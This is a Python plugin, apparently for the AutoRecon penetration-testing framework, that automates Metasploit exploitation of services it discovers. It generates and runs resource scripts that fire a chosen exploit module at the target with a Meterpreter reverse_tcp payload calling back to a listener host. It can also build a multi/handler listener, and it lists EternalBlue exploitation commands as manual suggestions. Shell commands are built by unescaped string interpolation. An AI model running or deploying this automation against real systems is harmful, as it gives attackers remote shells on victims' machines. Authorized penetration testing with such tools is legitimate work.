from autorecon.plugins import ExploitScan
import os

class MetasploitExploit(ExploitScan):
    """Metasploit exploitation plugin for automated exploitation of discovered vulnerabilities."""

    def __init__(self):
        super().__init__()
        self.name = "Metasploit Exploit"
        self.tags = ['attack', 'exploit', 'metasploit']
        self.risk_level = 'high'
        self.requires_confirmation = True

    def configure(self):
        self.add_option('module', help='Metasploit module to use (e.g., exploit/windows/smb/ms17_010_eternalblue)')
        self.add_option('payload', default='windows/meterpreter/reverse_tcp', help='Payload to use. Default: %(default)s')
        self.add_option('lhost', help='Local host IP for reverse connections')
        self.add_option('lport', default='4444', help='Local port for reverse connections. Default: %(default)s')
        self.add_option('timeout', default='30', help='Timeout in seconds for exploit attempts. Default: %(default)s')
        self.add_true_option('auto-handler', help='Automatically start multi/handler for payloads')
        
        # Match common vulnerable services
        self.match_service_name(['^smb', '^microsoft\\-ds', '^netbios'])  # SMB vulnerabilities
        self.match_service_name(['^http', '^https'])  # Web application vulnerabilities
        self.match_service_name(['^ssh'])  # SSH vulnerabilities
        self.match_service_name(['^ftp'])  # FTP vulnerabilities

    def check(self):
        # Check if msfconsole is available
        if not self._command_exists('msfconsole'):
            self.error('msfconsole is not available. Please install Metasploit Framework.')
            return False
        return True

    def _command_exists(self, command):
        """Check if a command exists in the system PATH."""
        return os.system(f'which {command} > /dev/null 2>&1') == 0

    async def run(self, service):
        if not self.get_option('module'):
            self.warn('No Metasploit module specified. Skipping exploitation.')
            return

        module = self.get_option('module')
        payload = self.get_option('payload')
        lhost = self.get_option('lhost')
        lport = self.get_option('lport')
        timeout = self.get_option('timeout')
        
        if not lhost:
            self.warn('No LHOST specified. Skipping exploitation.')
            return

        self.info(f'Attempting to exploit {service.target.address}:{service.port} using {module}')

        # Create Metasploit resource script
        resource_script = f'''
use {module}
set RHOSTS {service.target.address}
set RPORT {service.port}
set PAYLOAD {payload}
set LHOST {lhost}
set LPORT {lport}
set ExitOnSession false
exploit -j
'''

        resource_file = os.path.join(service.target.scandir, f'metasploit_{service.protocol}_{service.port}_exploit.rc')
        with open(resource_file, 'w') as f:
            f.write(resource_script)

        # Execute Metasploit
        cmd = f'timeout {timeout} msfconsole -q -r "{resource_file}" -o "{service.target.scandir}/{service.protocol}_{service.port}_metasploit_exploit.txt"'
        
        await service.execute(cmd)

        # If auto-handler is enabled, create a handler script
        if self.get_option('auto_handler'):
            handler_script = f'''
use multi/handler
set PAYLOAD {payload}
set LHOST {lhost}
set LPORT {lport}
set ExitOnSession false
exploit -j
'''
            handler_file = os.path.join(service.target.scandir, f'metasploit_handler_{lport}.rc')
            with open(handler_file, 'w') as f:
                f.write(handler_script)

    def manual(self, service, plugin_was_run):
        if not plugin_was_run:
            service.add_manual_command('Metasploit exploitation suggestions:', [
                'msfconsole',
                '# Search for exploits: search {service}',
                '# Example SMB exploitation:',
                'use exploit/windows/smb/ms17_010_eternalblue',
                'set RHOSTS {address}',
                'set PAYLOAD windows/meterpreter/reverse_tcp',
                'set LHOST [your_ip]',
                'exploit',
                '',
                '# Example web application exploitation:',
                'use auxiliary/scanner/http/dir_scanner',
                'set RHOSTS {address}',
                'set RPORT {port}',
                'run'
            ])